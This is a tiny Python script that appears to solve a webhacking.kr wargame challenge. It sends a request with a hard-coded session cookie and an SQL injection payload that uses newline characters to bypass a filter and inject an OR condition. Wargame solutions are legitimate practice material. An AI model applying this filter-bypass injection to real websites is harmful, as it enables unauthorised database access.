import requests

url = "http://webhacking.kr/challenge/web/web-32/index.php"

headers = {
	"Cookie": "oldzombie=1; PHPSESSID=ce7d7b3317819f9f01951a6263279e37",
	"Host": "webhacking.kr"
}

params = {
	"no":"0\nor\nno=2"
}

req = requests.get(url, headers=headers, params=params)
print req.content
